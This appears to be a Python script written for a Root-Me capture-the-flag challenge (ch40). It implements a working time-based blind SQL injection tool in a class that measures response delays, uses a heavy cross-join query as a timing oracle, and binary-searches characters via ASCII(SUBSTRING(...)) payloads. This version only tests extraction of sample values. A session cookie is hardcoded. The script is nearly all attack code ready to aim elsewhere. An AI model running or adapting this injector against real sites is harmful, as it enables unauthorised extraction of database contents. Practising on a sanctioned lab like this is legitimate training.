#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 9 - PROBAR CON VALORES NUMÉRICOS
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def extract_string(self, query, label="Extrayendo"):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, 20):
            # Usar búsqueda binaria para encontrar el carácter
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
                if self.is_true(cond, repeats=2):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:  # NULL o espacio
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("=" * 70)
print("  PROBANDO CON VALORES NUMÉRICOS")
print("=" * 70)

# 1. Probar con un número conocido: 12345
print("\n[1] Extrayendo 12345")
result = injector.extract_string("SELECT 12345", "Valor 12345")
print(f"  Resultado: {result}")

# 2. Probar con CONCAT para construir strings
print("\n[2] Extrayendo CONCAT('a','b','c')")
result = injector.extract_string("SELECT CONCAT('a','b','c')", "CONCAT abc")
print(f"  Resultado: {result}")

# 3. Probar con HEX (debería devolver 616263 para 'abc')
print("\n[3] Extrayendo HEX('abc')")
result = injector.extract_string("SELECT HEX('abc')", "HEX abc")
print(f"  Resultado: {result}")

# 4. Probar con ORD (equivalente a ASCII)
print("\n[4] Extrayendo ORD('a')")
result = injector.extract_string("SELECT ORD('a')", "ORD a")
print(f"  Resultado: {result}")
